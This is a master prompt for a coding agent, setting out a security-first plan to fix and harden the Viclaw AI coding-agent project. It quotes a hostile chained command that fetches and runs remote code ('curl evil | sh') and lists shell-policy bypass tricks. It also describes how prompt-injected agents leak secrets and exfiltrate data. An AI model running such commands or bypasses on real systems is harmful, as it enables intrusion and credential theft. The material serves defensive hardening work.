# Viclaw Master Prompt: Research-Driven Fix and Upgrade Plan

For: OpenCode (or any coding agent with web search, web fetch, shell and git). Repo: nganphungthi-pixel/viclaw. Baseline audit date: 2026-10-10, commit 8906c35.

How to use: save this file as docs/MASTER_PROMPT.md in the repo, then tell the agent: 'Read docs/MASTER_PROMPT.md completely, then execute Phase 0 first. Follow every rule. Report after each task.'

## 0. Role and mission

You are a senior staff engineer, security reviewer and researcher. You are working on Viclaw, a TypeScript AI coding agent (CLI, TUI, web gateway, channels, scheduler, mandate ledger).

Mission: turn Viclaw from a broad prototype into a trustworthy, focused, evidence-backed open-source project that communities (students, low-resource developers, people who want a free local coding agent) can really use, and that a hiring manager or investor can verify in 10 minutes by reading the README, CI, tests and benchmark results.

Principle: truth over hype. Every claim in the README must be backed by a test, an eval result or a link. If a feature is a stub, say so or remove it.

## 1. Non-negotiable rules

1. Research before every task (section 2). No coding from memory alone.
2. Today's date is around October 2026. Versions, APIs, CVEs, model names, specs and prices change. Verify on the npm registry, official docs and advisories. Never assume.
3. Never invent sources. Cite only pages you actually opened. Record URL, access date and the exact claim you used. If you cannot find evidence, write UNVERIFIED and choose the most conservative option.
4. The baseline numbers in section 4 are my measurements. Re-measure in Phase 0 and trust your fresh numbers if they differ.
5. One task = one branch and a small series of commits (Conventional Commits). Never force-push main. Never delete or weaken tests to make them pass. Never add blanket eslint-disable. Never commit secrets. Never copy code whose license is incompatible with MIT.
6. Stop and ask the human before: choosing the product focus (Option A or B in task P4-2), breaking public API changes, anything that needs a paid account, deleting a whole feature.
7. Never fake popularity or results (stars, bots, invented users, cherry-picked benchmarks). Publish failed results honestly.
8. If a tool you need is missing (web search, Docker, Windows), say so in the report and use the closest safe alternative. Do not pretend you verified something you did not.

## 2. Research protocol (run for EVERY task)

Step 1. Write the research question in one sentence.
Step 2. Collect sources. Minimum 3 sources per task: at least 2 Tier 1, and at least 1 reference implementation.
• Tier 1 (primary): official docs, specs, RFCs, standards (OWASP, NIST, CWE), security advisories (GitHub Security Advisories, NVD), source code of reference projects.
• Tier 2: benchmarks, papers (arXiv, Google Scholar), engineering blogs from vendors or maintainers that include data or code.
• Tier 3: forums, HN, Reddit, Medium. Use only as leads, never as the only proof.
Step 3. Compare with at least 3 similar open-source agents and read how they solved the same problem in their code, issues and advisories, not only their README. Candidates: opencode, aider, cline, goose, OpenAI Codex CLI, Gemini CLI, OpenHands, Continue, Claude Code docs.
Step 4. Search the failure side on purpose: '<topic> vulnerability', '<topic> bypass', '<topic> CVE', '<topic> postmortem', GitHub issues labelled bug. Learn from other people's incidents.
Step 5. Where to search: web search engines, GitHub (code search, issues, advisories, releases), npm registry (npm view <pkg> versions time), arXiv and Google Scholar, vendor engineering blogs, conference talks, OWASP cheat sheets, MITRE ATLAS, specs for MCP, AP2, WebSocket and HTTP.
Step 6. Write docs/research/<task-id>-<slug>.md (max one page): question, sources table (URL, date, tier, key claim), conflicts between sources, decision, rejected alternatives and why, remaining risks. If sources conflict, prefer Tier 1, then the newer one, then ask the human.

## 3. Cross-check protocol (run AFTER every task)

Definition of Done. A task is finished only when all of these are true:
1. Red to green: at least one test that fails before the change and passes after it.
2. npm run typecheck, npm run lint, npm test, npm run build are all clean. Coverage is not below the current ratchet.
3. Adversarial tests: at least 5 hostile inputs for every security-relevant change. Use property-based tests (fast-check) or fuzzing where possible.
4. Independent verification: prove it with a second method, not only unit tests with mocks. Run the real CLI, call the real endpoint with curl, run the real Docker image, use a real local model through Ollama if available.
5. Hostile self-review: read the full git diff as an attacker. Write down 5 ways it could fail, regress or be bypassed. Fix them or document them.
6. Regression sweep: full suite, plus smoke tests (viclaw --help, viclaw ask with a fake provider, serve then GET /health).
7. Research cross-check: compare the final implementation against your sources and the standard. List any deviation and why.
8. Docs: update the README claim table, CHANGELOG and SECURITY.md when relevant.
9. Post the task report below.
Gate: do not start the next task until Done is met, or the task is reported as BLOCKED with the reason.

Task report template:
• Task ID and title
• What was wrong (evidence)
• What I changed (files, commits)
• Research used (links to docs/research file)
• Tests added and results (before and after numbers)
• Cross-check results (second method, adversarial cases, hostile review findings)
• Remaining risks and next step

## 4. Baseline (measured on 2026-10-10)

• Build and typecheck clean. 161 of 161 tests pass (10 test files).
• Coverage: 21.8% lines overall. Mandates 97.6%, scheduler 90.4%, search-tools 92.7%, providers/messages 99%. 0% for channels, commands, config, connectors, expertise, governance, hooks, mcp, platform, plugins, reasoning, research, session, skills, tui, voice. Sandbox about 10%.
• ESLint: 330 problems (256 errors, 74 warnings). CI does not run lint.
• npm audit: 15 vulnerabilities (5 critical, 1 high, 9 moderate), mostly through node-telegram-bot-api. CI runs npm ci --no-audit.
• Bash tool: spawns sh -c with env: { ...process.env } (all secrets visible). Allow-list checks only the first token, so chained commands bypass it. Block-list is substring match. Default allowedCommands is empty, meaning everything is allowed. Unix only.
• Gateway: no Origin check on WebSocket, token compared with ===, only a warning when bound to a non-loopback host without a token, static server uses startsWith(publicDir) without a path separator, no .svg mime type, query string not stripped, no payload size limit.
• Mandates: README says 'signed receipts' but code only does sha256 of JSON.stringify (not signed, not canonical JSON).
• Connectors: 2692-line TypeScript file, 255 entries, only 9 with an mcpPackage and 1 with restApi. Header claims 'ALL connectors from Claude's connector catalog'. README lists them like working integrations.
• Stubs and TODOs: plugins/api.ts (TTS and search stubs), memory/mod.ts ('Skill execution not implemented'), skills/mod.ts (TODO templates).
• Code health: 62 uses of any. Large files: connectors/registry.ts 2692, providers/mod.ts 1444, cli.ts 1256, tools/mod.ts 1069 lines.
• Old dependency: @google/generative-ai ^0.2.1 (check whether it is deprecated in favour of @google/genai). Hardcoded old model names in README and defaults.
• Project hygiene: version 1.0.0 with 11 commits, one maintainer, no releases, no benchmark, no published package.

## 5. Exit targets

• Coverage: overall at least 60%, core modules (tools, agent, gateway, sandbox, security, providers, scheduler, mandates) at least 80%.
• Lint: 0 errors, warnings under 20, enforced in CI. Prettier check in CI.
• npm audit --audit-level=high: 0 findings, enforced in CI.
• any count at most 5 and each one justified in a comment.
• No source file over 500 lines (generated data files excluded and moved to JSON).
• CLI cold start for --help under 500 ms. Install size measured and reported.
• A reproducible eval harness with published results (pass rate, cost, time, sample size).
• Every README feature marked with a status (stable, beta, experimental, planned) and an evidence link.
• Version 0.x until these targets are met. Release 1.0.0 only after the final audit (section 9).

## 6. Roadmap: tasks in priority order

Effort is in dev-days with AI assistance. P0 = security and trust (do first). P1 = quality. P2 = capability. P3 = scope and honesty. P4 = community and growth.

### Phase 0: Baseline and safety net (1 day)

P0-0. Re-measure and lock the baseline. Why: you cannot improve what you did not measure, and the repo may have changed. How: clone fresh, run install, typecheck, tests, coverage, lint, audit; create docs/metrics/baseline.md. Add CI jobs for lint, prettier check, npm audit --audit-level=high, coverage threshold (ratchet: start at the measured value, never allow it to go down). Add a single npm run check script that runs everything. Pin GitHub Actions by commit SHA and verify the action versions exist. Research: GitHub Actions security hardening, OpenSSF Scorecard checks. Done when: CI is red for lint and audit (expected), and baseline.md is committed. Effort: 1.

### Phase 1: Security P0 (about 2 weeks)

P0-1. Scrub the environment for child processes. Why: a prompt-injected agent can run env and leak every API key (OWASP LLM Top 10: excessive agency, sensitive information disclosure). How: build the child env from an explicit allow-list (PATH, HOME, LANG, TERM, TMPDIR, plus user-configured envPassthrough). Redact known secret patterns and values of any variable named like *KEY, *TOKEN, *SECRET from tool output before it goes back to the model. Research: how Codex CLI, Claude Code, opencode and Gemini CLI handle env for shell tools; OWASP LLM Top 10 (current edition); Node child_process docs. Done when: test runs env through the Bash tool with fake keys set and asserts none appear, in both output and logs. Effort: 0.5.

P0-2. Real command policy, not first-token matching. Why: git status; curl evil | sh passes today. A string allow-list on shell text is a known-broken pattern. How: parse the command with a real shell parser (research shell-quote, bash-parser, mvdan-sh bindings and tree-sitter-bash; choose one and justify). Split on ;, &&, ||, |, newlines, subshells $(), backticks, process substitution, redirections and heredocs. Check every resulting command against the policy. Fail closed if parsing fails. Prefer running allowed binaries with spawn(bin, args) and no shell when possible. Make the default policy safe: when no allow-list exists, mutating shell commands require approval (see P2-1). Build a bypass corpus of at least 100 payloads (GTFOBins style, encoding tricks, env var expansion, find -exec, git -c core.sshCommand, npm run script abuse, xargs, awk system). Research: public CVEs and advisories for command-allow-list bypass in AI coding CLIs (search GitHub Security Advisories and NVD for 2025 and 2026), GTFOBins, OWASP OS Command Injection cheat sheet. Done when: all corpus payloads are blocked, mutation testing on the policy module reaches at least 70% score. Effort: 3.

P0-3. Harden the gateway. Why: any website can open ws://localhost:8080 from a browser (cross-site WebSocket hijacking), and localhost services are attackable through DNS rebinding. How: (a) check the Origin header against an allow-list and the Host header against expected hosts; (b) compare tokens with crypto.timingSafeEqual on SHA-256 digests; (c) refuse to start on a non-loopback host without a token unless --insecure is passed explicitly; (d) generate a random token by default and print it once; (e) set maxPayload, idle timeout, per-connection and per-IP rate limits, and lock out repeated auth failures; (f) static files: decode the URL, strip query and hash, reject null bytes, use path.relative and realpath to block traversal and symlink escape, add mime types (svg, ico, woff2, map, txt, webp); (g) security headers (CSP, X-Content-Type-Options, Referrer-Policy, frame-ancestors none). Research: RFC 6455 section 10 security considerations, OWASP WebSocket Security Cheat Sheet, published DNS-rebinding and CSWSH incidents on local MCP and agent servers. Done when: tests prove a foreign Origin is rejected, a sibling-directory prefix path is rejected, traversal and encoded traversal are rejected, timing-safe compare is used, and a real browser-style WebSocket test fails without token. Effort: 2.

P0-4. Make mandate receipts really signed and tamper-evident. Why: the README claims signed receipts, the code hashes only. For a money-safety feature this gap destroys trust. How: canonicalize with RFC 8785 JSON Canonicalization Scheme (not raw JSON.stringify), sign with Ed25519 through node:crypto, store the key with 0600 permissions (or OS keychain if available), include key id and signature in receipts, add viclaw mandates verify <receipt>. Make the ledger an append-only hash chain (each entry includes the previous entry hash) and add file locking or atomic writes for concurrent access. Validate money in integer minor units only, with currency checks and overflow tests. Research: AP2 specification (verify the current version), RFC 8785, Node crypto docs, how other ledgers do tamper evidence. Done when: modifying any ledger line makes verify fail, concurrent authorizations never double-spend (stress test with 50 parallel calls), receipts verify with an independent tool (for example a small separate script or openssl). Effort: 3. If you decide not to sign, remove the word 'signed' everywhere instead.

P0-5. Fix dependency risk. Why: 5 critical and 1 high vulnerabilities, plus a large attack surface from channel SDKs everyone installs. How: run npm audit and read each advisory (is it reachable in Viclaw?); replace node-telegram-bot-api with a maintained library (research grammY and telegraf); migrate Gemini to the current Google SDK after checking deprecation; move heavy optional pieces (playwright, discord.js, slack bolt, telegram, aws sdk, edge-tts) to optionalDependencies or separate packages loaded lazily; enable Dependabot or Renovate; add npm publish --provenance; generate an SBOM (CycloneDX). Research: npm advisories, each library's maintenance status (last release, open issues), Node 22 and 24 support. Done when: npm audit --audit-level=high is clean, install size before and after is reported, CI enforces audit. Effort: 2.

P0-6. Prompt-injection and exfiltration defense. Why: an agent that reads the web and runs tools has the 'lethal trifecta' (private data, untrusted content, outbound channel). How: tag all tool results from web, files and MCP as untrusted data; once untrusted content is in context, require approval for network egress tools and for shell commands that touch the network; strip or neutralize hidden instructions (zero-width characters, HTML comments); block markdown image exfiltration in the web UI; add canary-token tests. Build an injection test suite with at least 50 real-world payloads. Research: OWASP LLM01 prompt injection, Simon Willison's writing on the lethal trifecta, Anthropic and OpenAI guidance on prompt injection for agents, recent MCP tool-poisoning incidents. Done when: the suite shows exfiltration attempts blocked, and results are documented honestly (injection is not fully solved; document residual risk in SECURITY.md). Effort: 3.

P0-7. Sandbox by default. Why: sandbox coverage is about 10% and the compose file mounts /var/run/docker.sock, which is full host control. How: default the Bash tool into a sandbox when one is available (Docker rootless or a no-socket container: no network by default, read-only root, dropped capabilities, seccomp, CPU, memory and pid limits, project directory mounted only). Remove the docker.sock mount from compose and offer a safer alternative (Sysbox, rootless Docker, or a separate runner). Add OS-level fallbacks: bubblewrap on Linux, sandbox-exec (Seatbelt) on macOS, and a documented WSL path for Windows. Research: how Codex CLI and Claude Code implement their sandboxes, Docker hardening docs (CIS benchmark), bubblewrap docs. Done when: integration tests prove the sandbox blocks network, blocks writes outside the project, and kills runaway processes; sandbox coverage at least 70%. Effort: 5.

P0-8. Cross-platform shell. Why: Bash needs Unix sh, so Windows users (a large part of students) cannot run shell tools. How: detect Git Bash, WSL, pwsh or cmd; run commands through the right adapter; normalize paths and line endings. Research: Node spawn behavior on Windows, how opencode and Codex handle Windows. Done when: the full tool suite passes on windows-latest in CI with real shell tests. Effort: 2.

### Phase 2: Engineering quality P1 (about 3 weeks, can overlap)

P1-1. Zero lint errors. Fix the 256 errors in small commits grouped by rule (unused vars, empty blocks, require imports, and so on). No blanket disables. Research: typescript-eslint recommended and strict configs. Done when: npm run lint is clean and enforced in CI. Effort: 2.

P1-2. Type safety. Replace the 62 any with unknown plus zod parsing or proper types. Turn on noUncheckedIndexedAccess, noImplicitOverride, noFallthroughCasesInSwitch, and consider exactOptionalPropertyTypes. Validate all external input (provider responses, MCP messages, config, WebSocket messages) with zod. Done when: any count at most 5. Effort: 3.

P1-3. Refactor giant files without changing behavior. First add characterization (golden) tests. Then split cli.ts into one file per command, providers/mod.ts into one file per provider plus a shared base, tools/mod.ts into one file per tool. Keep public exports stable. Done when: no file over 500 lines and all old tests still pass unchanged. Effort: 4.

P1-4. Raise coverage with ratchets. Order: week 2 reach 40%, week 4 reach 60%, then 70%. Start with zero-coverage modules that matter: config, session, commands, mcp, research, channels, hooks, skills, plugins. Tools: undici MockAgent or msw for HTTP, a scripted fake LLM server for end-to-end agent loops, fast-check for path and command parsers, Stryker mutation testing on security modules. Add Windows and macOS runs. Done when: thresholds enforced in CI. Effort: 8 (spread over the roadmap).

P1-5. Remove or finish stubs. For each stub (plugin TTS and search, skill execution, TODO templates): implement it with tests, or delete it and remove it from the README. Rule: no stub is allowed in the feature list. Effort: 2.

P1-6. Observability and errors. Structured logging (pino) with secret redaction and levels; --debug flag; optional OpenTelemetry using the GenAI semantic conventions (verify current status); accurate token and cost accounting with a versioned pricing table; crash-safe session writes (atomic rename); user-friendly error messages with fix hints. Effort: 3.

P1-7. Config and viclaw doctor. Zod-validated config with a generated JSON schema and documented defaults. viclaw doctor checks Node version, Docker, Ollama reachability and installed models, API keys present (never print them), network, disk, permissions, and gives exact fix commands. Effort: 2.

P1-8. Startup time and install size. Lazy-load heavy modules, measure viclaw --help cold start (target under 500 ms) and install size, report before and after. Effort: 1.

### Phase 3: Agent capability P2 (about 4 to 6 weeks)

P2-1. Real approval loop. Today ask mode just fails closed. Implement interactive approvals in CLI, TUI and Web UI: allow once, allow always for this pattern, deny, with diff preview for edits and the exact command for shell. Persist rules per project. Headless mode (scheduler, daemon) must use an explicit pre-approved profile and never silently allow. Research: permission designs in Claude Code, opencode and Codex CLI. Effort: 4.

P2-2. Reliable editing and undo. Robust edit tool: exact match first, whitespace-tolerant fallback, clear failure messages, preserve line endings and file mode, atomic writes. Checkpoints before each agent turn (git shadow commits or stash) with /undo. Research: Aider edit-format benchmarks and papers on edit formats, opencode edit tool, Cline diff approach. Done when: an edit-accuracy eval on at least 100 cases is published. Effort: 5.

P2-3. Context engineering. Repo map with tree-sitter (symbols and file ranking), accurate per-provider token counting, high-quality compaction (measure with evals, not feelings), load project instruction files (AGENTS.md as the common standard, plus CLAUDE.md compatibility), respect .gitignore, safe handling of huge files and binary files. Research: Aider repo-map write-ups, AGENTS.md specification, long-context degradation papers. Effort: 6.

P2-4. Provider layer. Fetch model lists and capabilities dynamically (no stale hardcoded model names), a capability matrix (tools, vision, context window, price), retry with exponential backoff and jitter honoring Retry-After, correct streaming tool-call assembly, generic OpenAI-compatible endpoint (LM Studio, vLLM, llama.cpp server, any gateway). Local small-model mode: smaller tool set, simpler schemas, JSON repair, shorter system prompt, constrained output through Ollama's format support, and a hardware detector that recommends model and quantization from RAM and VRAM. Test with real small models (for example Qwen3-Coder 8B class) and publish the numbers. Research: Ollama API docs (tools and structured output), current coding model leaderboards, quantization trade-offs. Effort: 6.

P2-5. MCP and editor integration. Implement Streamable HTTP transport and OAuth per the current MCP specification (verify the latest spec revision and security best practices first), keep stdio, add server allow-list and per-server permission scopes, defend against tool poisoning and rug-pull updates (pin tool descriptions by hash). Evaluate Agent Client Protocol (ACP) for Zed and other editors. Research: MCP spec and security guidance, real incident writes-ups. Effort: 6.

P2-6. Eval harness and public benchmark (most important for credibility). Create evals/ with reproducible Docker runs: a 30 to 50 task own suite, plus a documented subset of SWE-bench Lite or Verified, Aider polyglot (Exercism) and Terminal-Bench where feasible. Record pass rate, cost, time, tokens, number of runs, seeds and variance. Compare: free stack versus a paid model versus a local model. Document contamination caveats. Publish the table and the raw logs in the README. Research: current benchmark methodology and known pitfalls, how other open agents report results. Done when: anyone can reproduce your numbers with one command. Effort: 10.

P2-7. Prove or rename the 'Learning engine' and 'Multi-agent'. Run A/B evals with the feature on and off. If there is no measurable gain, rename it honestly (memory, notes) or remove it. Cap sub-agent concurrency and cost. Effort: 3.

P2-8. Scheduler and daemon hardening. Single-instance lock, systemd and launchd unit examples, DST and timezone tests for cron, clear missed-run policy, failure notifications, jobs run under a restricted permission profile by default, per-job budget caps. Effort: 3.

### Phase 4: Scope and honesty P3 (do early, about 1 week)

P3-1. Connectors reality check. Move the catalog out of the 2692-line TypeScript file into validated JSON data. Classify every entry as working, mcp-config-only or planned, and show that status in /connectors. Remove the header claim about 'Claude's connector catalog' and any trademark-style implication of official partnership (nominative use plus a disclaimer). Drop dubious or irrelevant entries. Make 8 to 10 connectors truly work end to end with tests against real servers (for example GitHub, Postgres, SQLite, filesystem, Playwright, a search API, Slack, Sentry). Add viclaw connectors doctor. Research: official MCP server repos and their maintenance status. Effort: 4.

P3-2. Choose one focus (ask the human). Present these options with evidence from your research and wait for the decision. Option A, 'Safe autonomous coding agent': sandbox by default, approval loop, injection defenses, audit log, scheduler, signed mandates. Option B, 'Free coding agent for students and low-resource communities': best-in-class local small-model performance, offline mode, hardware-aware model picker, tutor mode, Hindi and Vietnamese and other languages. After the decision, move unrelated areas (voice, governance, CRM-style connectors) into packages/experimental or delete them. Effort: 3.

P3-3. README rewrite with a claim table. Each feature gets status (stable, beta, experimental, planned) and an evidence link (test file or eval). Add an honest 'Limitations' section. Add a comparison with alternatives (fair, with dates). Use version 0.x. Effort: 1.

P3-4. Legal and naming. Run a license audit (license-checker or similar), add THIRD_PARTY_NOTICES, check that no code was copied with an incompatible license, check name conflicts for 'Viclaw' on npm, GitHub and trademark databases, document data flows and privacy (no telemetry by default, the free-tier-trains-on-prompts warning stays visible). Add a clear AI-generated-code and contribution policy. Effort: 2.

### Phase 5: Community and growth P4 (ongoing)

P4-1. Docs that work. Structure with Diataxis (tutorial, how-to, reference, explanation). A quickstart that a new user completes in under 5 minutes, tested on fresh Windows, macOS, Linux and WSL. Troubleshooting page, architecture diagrams, threat model (STRIDE) and a security.txt. Effort: 4.

P4-2. Contributor experience. Devcontainer, npm run check, 20 well-written good-first-issues, CODEOWNERS, Discussions, public roadmap, issue and PR templates (already present), changesets or semantic-release, GitHub private vulnerability reporting enabled. Review every PR within 72 hours. Effort: 3.

P4-3. Distribution. npm publish with provenance, multi-arch Docker image on GHCR, Homebrew, winget and scoop manifests, install script with checksum verification, a 2-minute demo video and GIF in the README. Effort: 3.

P4-4. Community impact (pick 2). (a) Offline learning kit: tutor mode that explains instead of just doing, classroom setup guide for low-spec labs, model packs for 8 GB RAM machines. (b) Multilingual support: docs and CLI messages in Vietnamese, Hindi and others with a translation workflow. (c) Open dataset of coding prompts in local languages plus an eval for them. (d) Write-ups: 'What we learned running coding agents on free and local models', with real data. Present the community where they already are (college clubs, Telegram and Discord groups, local meetups) and collect real feedback. Effort: 8.

## 7. Timeline summary

• Week 1: P0-0, P0-1, P0-2, P0-3, P3-1, P3-3 (trust and honesty first).
• Week 2: P0-4, P0-5, P0-6, P1-1, P3-2 decision.
• Weeks 3 to 4: P0-7, P0-8, P1-2, P1-3, P1-4 (to 40% then 60%), P1-5, P1-7.
• Weeks 5 to 8: P2-1 to P2-8, P1-6, P1-8.
• Weeks 6 onward in parallel: P3-4, P4-1 to P4-4.
• Total: about 95 dev-days of work with AI assistance, so about 10 weeks for one focused person. If time is short, do P0 and P3 first, then P2-6 (evals), because those create the most trust.

## 8. Things you must NOT do

• Do not add new big features before P0 is done.
• Do not widen the scope (new integrations, new channels) while the current ones have 0% coverage.
• Do not claim a number you did not measure. Do not round up.
• Do not hide failures. A published honest 35% pass rate is worth more than an unverifiable 80%.
• Do not paste long text from other projects. Summarize in your own words and cite.

## 9. Final audit and release gate

When all tasks are done, run a full independent audit:
1. Fresh clone on Linux, macOS and Windows: install, check, build, smoke test.
2. Re-measure every metric in section 4 and fill a before and after table in docs/metrics/final.md.
3. Red-team day: try to break your own sandbox, command policy, gateway and ledger. Record every finding and fix or document it.
4. Re-run the eval suite on a clean machine and compare with the published numbers.
5. Re-verify all README claims against evidence. Remove any claim without evidence.
6. Check dependencies, license and SBOM once more. Check OpenSSF Scorecard.
7. Write a release note with honest limitations. Tag 0.9 first, collect real-user feedback for two weeks, then decide on 1.0.0.

## 10. Start now

First actions: (1) read this file fully, (2) run P0-0 and show me the baseline table, (3) show me your research file for P0-1, (4) only then implement P0-1. After every task, post the task report and wait for my 'continue' unless I tell you to proceed automatically.
